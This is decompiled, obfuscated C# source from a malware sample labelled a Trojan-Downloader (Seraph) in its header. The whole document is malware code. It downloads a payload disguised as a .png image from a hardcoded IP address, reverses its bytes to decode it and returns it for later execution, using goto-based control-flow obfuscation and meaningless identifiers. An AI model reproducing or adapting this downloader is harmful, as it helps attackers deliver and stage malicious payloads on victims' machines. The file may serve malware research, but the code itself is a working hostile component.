// Decompiled with JetBrains decompiler
// Type: 
// Assembly: Itphfswii, Version=8.82.0.403, Culture=neutral, PublicKeyToken=null
// MVID: DD669258-BA36-4588-2049-CC56909BC964
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-Downloader.MSIL.Seraph.alsx-838a8fab72d527c2817b806f6978e6e36de1a101d89646855704b5a0ae044db8.exe

using System.Collections.Concurrent;
using System.IO;
using System.Net;

internal static class \u0002
{
  private static byte[] \u0002(byte[] _param0)
  {
    ConcurrentQueue<byte> concurrentQueue1 = new ConcurrentQueue<byte>();
    if (true)
      goto label_3;
label_1:
    object obj1 = new object();
    if (true)
      goto label_4;
label_2:
    int length = _param0.Length;
    int index;
    if (true)
      index = length;
    ConcurrentQueue<byte> concurrentQueue2;
    object obj2;
    while (index-- > 0)
    {
      lock (obj2)
        concurrentQueue2.Enqueue(_param0[index]);
    }
    return concurrentQueue2.ToArray();
label_4:
    obj2 = obj1;
    goto label_2;
label_3:
    concurrentQueue2 = concurrentQueue1;
    goto label_1;
  }

  internal static byte[] \u0002()
  {
    try
    {
      if (true)
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
    }
    catch
    {
    }
    byte[] numArray1 = \u0002.\u0002(\u0002.\u0002("http://45.137.22.122/Itphfswii_Ehigyhkm.png"));
    if (true)
      goto label_5;
label_4:
    byte[] numArray2;
    return numArray2;
label_5:
    numArray2 = numArray1;
    goto label_4;
  }

  private static byte[] \u0002(string _param0)
  {
    MemoryStream memoryStream = new MemoryStream();
    MemoryStream destination;
    if (true)
      destination = memoryStream;
    try
    {
      WebRequest webRequest1 = WebRequest.Create(_param0);
      if (true)
        goto label_4;
label_3:
      WebRequest webRequest2;
      Stream responseStream = webRequest2.GetResponse().GetResponseStream();
      Stream stream;
      if (true)
        stream = responseStream;
      try
      {
        stream.CopyTo((Stream) destination);
        return destination.ToArray();
      }
      finally
      {
        stream?.Dispose();
      }
label_4:
      webRequest2 = webRequest1;
      goto label_3;
    }
    finally
    {
      destination.Dispose();
    }
  }
}
